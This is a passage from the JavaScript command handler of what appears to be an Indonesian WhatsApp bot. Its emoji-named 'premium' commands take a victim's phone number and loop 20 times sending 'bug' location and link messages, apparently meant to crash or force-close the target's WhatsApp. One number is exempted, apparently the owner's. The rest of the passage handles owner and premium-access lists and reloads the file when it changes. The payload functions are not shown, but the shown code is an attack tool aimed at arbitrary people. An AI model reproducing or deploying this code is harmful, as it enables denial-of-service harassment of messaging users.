await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case '👿': case '☕': case '🤡': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case '😜': case '🦁': case '🔥': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break
case '🤤': case '☠️': case '🌷': {
if (!isAkses) return reply('Fitur Khusus Premium!!')
if (!q) return reply(`Example ${command} 628xxx`)
let awal = q.replace(/[^0-9]/g, "")
if (awal.startsWith('0')) return reply("Gunakan Nomor Dengan Kode Negara")
let target = awal + '@s.whatsapp.net'
if (target === "6285691430784@s.whatsapp.net") return reply("Target Salah!!");
reply(`ĐØ₦Ɇ ฿₳₦₲ 🎉฿Ʉ₲ ₴ɄĐ₳Ⱨ ₮ɆⱤ₭łⱤł₥ ₭Ɇ ₮₳Ɽ₲Ɇ₮🔥...`)
for (let i = 0; i < 20; i++) {
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
bugLocation(target, modsLaxxy)
await bugLinsFc(target) 
bugLocation(target, laxzyMods)
await bugLinsFc(target) 
}
}
break

// Owner Menu
case 'owner':{
sendContact(from, owner, m)
}
break
// Add Owner
case 'addowner':{
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await LaxzyMods.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(yo)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
addowner = yo+`@s.whatsapp.net`
mentions(`sukses ${command} @${addowner.split('@')[0]}`, [addowner])
}
break
// Add Premium
case 'addprem':{
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
yo = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await LaxzyMods.onWhatsApp(yo + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
akses.push(yo)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
addakses = yo+`@s.whatsapp.net`
mentions(`sukses ${command} @${addakses.split('@')[0]}`, [addakses])
}
break

case 'delprem':{
if (!isDeveloper) return reply('untuk owner')
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 628xxx/@tag`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await LaxzyMods.onWhatsApp(ya + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
unp = akses.indexOf(ya)
akses.splice(unp, 1)
fs.writeFileSync('./database/akses.json', JSON.stringify(akses))
delakses = ya+`@s.whatsapp.net`
mentions(`sukses ${command} @${delakses.split('@')[0]}`, [delakses])
}
break

//▬▭▬▭▬▭▬▭▬[ BATAS ]▬▭▬▭▬▭▬▭▬//
default:
}
}

let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(chalk.yellowBright(`Update File Terbaru ${__filename}`))
delete require.cache[file]
require(file)
})